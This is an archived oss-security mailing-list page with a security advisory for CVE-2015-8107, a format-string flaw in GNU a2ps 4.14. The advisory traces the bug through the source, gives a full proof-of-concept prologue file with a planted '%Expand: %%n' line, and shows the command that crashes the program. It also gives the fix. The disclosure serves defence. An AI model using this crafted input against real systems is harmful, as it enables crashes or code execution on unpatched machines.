@@ -1,0 +1,400 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - CVE-2015-8107 - a2ps(gnu) v4.14 format string vulnerability</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="3">[&lt;prev]</a> <a href="5">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;5649AED2.3060009&#64;ropas.snu.ac.kr&gt;
+Date: Mon, 16 Nov 2015 19:24:18 +0900
+From: 김종권 &lt;jgkim&#64;...as.snu.ac.kr&gt;
+To: oss-security&#64;...ts.openwall.com
+Cc: wslee&#64;...as.snu.ac.kr
+Subject: CVE-2015-8107 - a2ps(gnu) v4.14 format string vulnerability
+
+Dear List,
+
+I am writing this to report a format string vulnerability in a2ps. 
+(4.14, which is the latest version)
+Also I already have been assigned a CVE identifier from MITRE 
+"CVE-2015-8107", so I want to make public this vulnerability.
+
+- Target Platform
+   Linux
+- Target Version
+   4.14 (Latest Version)
+
+- Vulnerability description
+When user runs a2ps with malicious crafted pro(a2ps prologue) file, an 
+attacker can execute arbitrary code.
+The function output_file processes the %Expand command in pro file.
+The variable `expansion' in the function output_file may hold a 
+malicious input string, which can be used as a format argument of vsprintf.
+
+-- Step 1. (ouput.c 524 line)
+
+524     expansion = ((char *)
+                          expand_user_string (job, FIRST_FILE (job),
+                                (const uchar *) "Expand: requirement",
+                                (const uchar *) token));
+
+For instance, the variable expansion will point to the string “%n” when 
+a text line "%Expand: %%\n” exists in an input pro file.
+
+-- Step 2. (output.c 525 line)
+
+525    output (dest, expansion);
+
+output() is called in line 525, and the argument `expansion' is used as 
+a format string, which can be malicious, as we described in step 1.
+
+-- Step 3. (output.c 873 line)
+182    void output (struct output * out, const char *format, ...){
+      ...
+202   ds_unsafe_cat_vsprintf (out-&gt;chunk,format, args);
+      ...
+
+The variable format, which can be malicious, can be passed to 
+ds_unsafe_cat_vsprintf() in line 202.
+
+-- step 4. (dstring.c 321 line)
+321    void ds_unsafe_cat_vsprintf (struct dstring * ds, const char 
+*format, va_list args){
+       ...
+326    vsprintf (ds-&gt;content + ds-&gt;len, format, args);
+       ...
+
+The value of format, which can be malicious, is used as an argument of 
+vsprintf in line 326, therefore arbitrary code can be executed.
+
+-- Step 4. Our malicious input
+"exploit.pro"
+===================================
+% -*-postscript-*-
+% PostScript Prologue
+%
+% $Id: matrix.pro,v 1.1.1.1.2.1 2007/12/29 01:58:27 mhatta Exp $
+%
+
+%
+% This file is part of a2ps.
+%
+% This program is free software; you can redistribute it and/or modify
+% it under the terms of the GNU General Public License as published by
+% the Free Software Foundation; either version 3, or (at your option)
+% any later version.
+%
+% This program is distributed in the hope that it will be useful,
+% but WITHOUT ANY WARRANTY; without even the implied warranty of
+% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+% GNU General Public License for more details.
+%
+% You should have received a copy of the GNU General Public License
+% along with this program; see the file COPYING.  If not, write to
+% the Free Software Foundation, 59 Temple Place - Suite 330,
+% Boston, MA 02111-1307, USA.
+%
+Documentation
+The layout is the same as samp(bw)samp, but alternating gray and white 
+lines.
+There are two macros defining the behavior:
+samp(pro.matrix.cycle)samp defines the length of the cycle (number of white
+and gray lines).  It defaults to 6.
+samp(pro.matrix.gray)samp defines the number of gray lines. Default is 3.
+EndDocumentation
+% -- code follows this line --
+%%IncludeResource: file base.ps
+%%IncludeResource: file a2ps.hdr
+%%BeginResource: procset a2ps-matrix-Prolog 2.0 1
+
+% Function T(ab), jumps to the n-th tabulation in the current line
+/T {
+  cw mul x0 add y0 moveto
+} bind def
+
+% Function n: move to the next line
+/n { %def
+  /y0 y0 bfs sub store
+  % Draw a grey background
+  /nline nline 1 add def
+% @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+% @@@@@@@@@@@@@@ Malicious user input @@@@@@@@@@@@@@@
+%Expand: %%n
+% @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+%Expand:  nline #{pro.matrix.cycle:-6} mod #{pro.matrix.gray:-3} ge {
+    gsave
+      newpath
+      x v get y0 currentfont /Descent get currentfontsize mul add moveto
+      pw 0 rlineto
+      0 bfs rlineto
+      pw neg 0 rlineto
+      closepath
+      0.9 setgray
+      fill
+    grestore
+  } if
+  x0 y0 moveto
+} bind def
+
+% Function N: show and move to the next line
+/N {
+  Show
+  n
+} bind def
+
+/S {
+  Show
+} bind def
+
+/p {
+  false UL
+  false BX
+%Face: Plain Courier bfs
+  Show
+} bind def
+
+/sy {
+  false UL
+  false BX
+%Face: Symbol Symbol bfs
+  Show
+} bind def
+
+/k {
+  false UL
+  false BX
+%Face: Keyword Courier-Oblique bfs
+  Show
+} bind def
+
+/K {
+  false UL
+  false BX
+%Face: Keyword_strong Courier-Bold bfs
+  Show
+} bind def
+
+/c {
+  false UL
+  false BX
+%Face: Comment Courier-Oblique bfs
+  Show
+} bind def
+
+/C {
+  false UL
+  false BX
+%Face: Comment_strong Courier-BoldOblique bfs
+  Show
+} bind def
+
+/l {
+  false UL
+  false BX
+%Face: Label Helvetica bfs
+  Show
+} bind def
+
+/L {
+  false UL
+  false BX
+%Face: Label_strong Helvetica-Bold bfs
+  Show
+} bind def
+
+/str{
+  false UL
+  false BX
+%Face: String Times-Roman bfs
+  Show
+} bind def
+
+/e{
+  false UL
+  true BX
+%Face: Error Helvetica-Bold bfs
+  Show
+} bind def
+
+%%EndResource
+%%BeginSetup
+% The font for line numbering
+/f# /Helvetica findfont bfs .6 mul scalefont def
+/nline 0 def
+%%EndSetup
+===================================
+
+Execute
+===================================
+~ $ a2ps --version
+GNU a2ps 4.14
+Written by Akim Demaille, Miguel Santana.
+
+Copyright (c) 1988-1993 Miguel Santana
+Copyright (c) 1995-2000 Akim Demaille, Miguel Santana
+Copyright (c) 2007- Akim Demaille, Miguel Santana and Masayuki Hatta
+This is free software; see the source for copying conditions. There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+~ $ a2ps --prologue=exploit test.tex -o test.ps
+aborted (core dumped)
+===================================
+
+- How to fix
+(output.c 525 line)
+525    output (dest, expansion); ===&gt; output (dest, "%s", expansion);
+
+- How we found the vulnerability
+
+We used a static analyzer, Sparrow[1], to find the format string bug. 
+Our analyzer reported an alarm in a2ps dstring.c 326 line, So we looked 
+for a a2ps source code and found the bug.
+
+Sparrow is a state-of-the-art static analyzer that aims to verify the 
+absence of fatal bugs in C source. Sparrow is designed by Abstract 
+Interpretation and the analysis is sound in design. Sparrow adopts a 
+number of well-founded static analysis techniques[2,3] for scalability, 
+precision, and user convenience.
+
+References
+[1]: <a href="http://ropas.snu.ac.kr/sparrow/" rel="nofollow">http://ropas.snu.ac.kr/sparrow/</a>
+[2]: Selective Context-Sensitivity Guided by Impact Pre-Analysis. Hakjoo 
+Oh, Wonchan Lee, Kihong Heo, Hongseok Yang, and Kwangkeun Yi. PLDI'14.
+[3]: Design and Implementation of Sparse Global Analyses for C-like 
+Languages. Hakjoo Oh, Kihong Heo, Wonchan Lee, Woosuk Lee, and Kwangkeun 
+Yi. PLDI'12
+
+Sincerely, Woosuk Lee &amp; Jong-Gwon Kim
+
+-----------------------------
+Woosuk Lee
+Ph.D. candidate
+ROPAS lab. (<a href="http://ropas.snu.ac.kr/" rel="nofollow">http://ropas.snu.ac.kr/</a>)
+ROSAEC center (<a href="http://rosaec.snu.ac.kr/" rel="nofollow">http://rosaec.snu.ac.kr/</a>)
+Seoul National University
+(tel) +82-2-880-1865
+(email) wslee&#64;...as.snu.ac.kr
+-----------------------------
+-----------------------------
+Jong-Gwon Kim
+Graduate student
+ROPAS lab. (<a href="http://ropas.snu.ac.kr/" rel="nofollow">http://ropas.snu.ac.kr/</a>)
+ROSAEC center (<a href="http://rosaec.snu.ac.kr/" rel="nofollow">http://rosaec.snu.ac.kr/</a>)
+Seoul National University
+(tel) +82-2-880-1865
+(email) jgkim&#64;...as.snu.ac.kr
+-----------------------------
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
